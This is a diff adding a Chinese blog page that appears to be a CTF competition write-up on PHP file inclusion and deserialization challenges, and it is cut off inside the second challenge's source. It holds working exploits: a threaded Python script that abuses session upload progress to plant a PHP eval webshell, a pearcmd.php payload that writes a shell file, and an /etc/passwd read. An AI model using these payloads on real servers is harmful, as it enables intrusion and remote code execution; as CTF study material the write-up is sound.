@@ -1,0 +1,778 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    CTFSHOW之元旦水友赛 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="web  easy_include （session文件包含&#x2F;pearcmd） 12345678910&lt;?phpfunction waf($path)&#123;    $path &#x3D; str_replace(&quot;.&quot;,&quot;&quot;,$path);    return preg_match(&quot;&#x2F;^[a-z]+&#x2F;&quot;,$path);&#125;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW之元旦水友赛">
+<meta property="og:url" content="http://example.com/2025/06/24/CTFSHOW%E4%B9%8B%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="web  easy_include （session文件包含&#x2F;pearcmd） 12345678910&lt;?phpfunction waf($path)&#123;    $path &#x3D; str_replace(&quot;.&quot;,&quot;&quot;,$path);    return preg_match(&quot;&#x2F;^[a-z]+&#x2F;&quot;,$path);&#125;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/06/24/images/20250624170245511.png">
+<meta property="og:image" content="http://example.com/2025/06/24/images/20250624175700714.png">
+<meta property="og:image" content="http://example.com/2025/06/24/images/20250624175729666.png">
+<meta property="og:image" content="http://example.com/2025/06/24/images/20250624175820046.png">
+<meta property="article:published_time" content="2025-06-23T16:49:35.000Z">
+<meta property="article:modified_time" content="2025-10-03T06:57:48.163Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta property="article:tag" content="php反序列化">
+<meta property="article:tag" content="session文件包含">
+<meta property="article:tag" content="裸文件包含">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/06/24/images/20250624170245511.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="CTFSHOW之元旦水友赛">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">CTFSHOW之元旦水友赛</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy_include-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABpearcmd"><span class="toc-number">1.1.</span> <span class="toc-text"> easy_include （session文件包含&#x2F;pearcmd）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-sessoin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 法一 sessoin文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-pearcmdphp%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 法二 pearcmd.php本地文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy_webphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text"> easy_web（php反序列化+命令执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 命令执行</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-CTFSHOW之元旦水友赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/06/24/CTFSHOW%E4%B9%8B%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-23T16:49:35.000Z" itemprop="datePublished">2025-06-24</time>
+    <time style="display: none;" id="post-update-time">2025-10-03</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2>
+<h3 id="easy_include-session文件包含pearcmd"><a class="markdownIt-Anchor" href="#easy_include-session文件包含pearcmd"></a> easy_include （session文件包含/pearcmd）</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单的文件包含题</p>
+<p>两个限制：<br />
+不能有点号</p>
+<p>以小写字母开头</p>
+<p>file伪协议是能读localhost或127.0.0.1的</p>
+<p>尝试1=localhost/etc/passwd</p>
+<p><img src="../images/20250624170245511.png" alt="image-20250624170245511" /></p>
+<p>读到了</p>
+<p>但我们不知道flag在哪</p>
+<h4 id="法一-sessoin文件包含"><a class="markdownIt-Anchor" href="#法一-sessoin文件包含"></a> 法一 sessoin文件包含</h4>
+<p>这时我们突然注意到这题开启了session</p>
+<p>那我们就能用session文件包含了</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url=<span class="string">&#x27;http://29273075-c82f-4e79-8937-13eaae3dd55b.challenge.ctf.show/&#x27;</span> <span class="comment">#引入url</span></span><br><span class="line">sessionid=<span class="string">&#x27;a07a636875b6a65a4fb6dec1f6274bc0&#x27;</span> <span class="comment">#PHPSESSID的值</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;localhost/tmp/sess_&quot;</span>+sessionid,</span><br><span class="line">    <span class="string">&quot;0&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span> <span class="comment">#将木马写入1.php</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment">#上传一个50k的文件</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=requests.post(url,data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[0]);?&gt;&#x27;</span> <span class="comment">#将这段代码写入session文件中</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid <span class="comment">#同上，PHPSESSID的值</span></span><br><span class="line">        &#125;,</span><br><span class="line">         files=&#123;</span><br><span class="line">             <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes) <span class="comment">#上传这个文件单单只是为了抓个包，其他一点用都没有,可以删除</span></span><br><span class="line">         &#125;</span><br><span class="line">         )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url,data=data,cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid      <span class="comment">#包含session文件让第一个eval执行，然后执行第二个eval</span></span><br><span class="line">        &#125;)</span><br><span class="line">        response2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>) <span class="comment">#获得回显</span></span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++perfect+++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        evnet=threading.Event()       <span class="comment">#开启线程</span></span><br><span class="line">        <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:        <span class="comment">#多线程操作</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">        evnet.<span class="built_in">set</span>()           <span class="comment">#将信号标志设置为True，并唤醒所有处于等待状态的线程。</span></span><br></pre></td></tr></table></figure>
+<h4 id="法二-pearcmdphp本地文件包含"><a class="markdownIt-Anchor" href="#法二-pearcmdphp本地文件包含"></a> 法二 pearcmd.php本地文件包含</h4>
+<p>这个解法我是没想到，为什么带点也行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/+/tmp/shell.php</span><br></pre></td></tr></table></figure>
+<p>POST: 1=localhost/usr/local/lib/php/pearcmd.php</p>
+<h3 id="easy_webphp反序列化命令执行"><a class="markdownIt-Anchor" href="#easy_webphp反序列化命令执行"></a> easy_web（php反序列化+命令执行）</h3>
+<h4 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h4>
+<p>题目提示：<strong>php版本为5.5.9</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Chu0</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;waf1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show/i&#x27;</span>, <span class="variable">$Chu0</span>))</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;waf2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_in_waf_php</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$a</span>,<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hinthinthint,base64喔&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;fastfast&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0 = <span class="string">&#x27;xiuxiuxiu&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;绕一下吧孩子&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;</span><br><span class="line">        &#125;</span><br><span 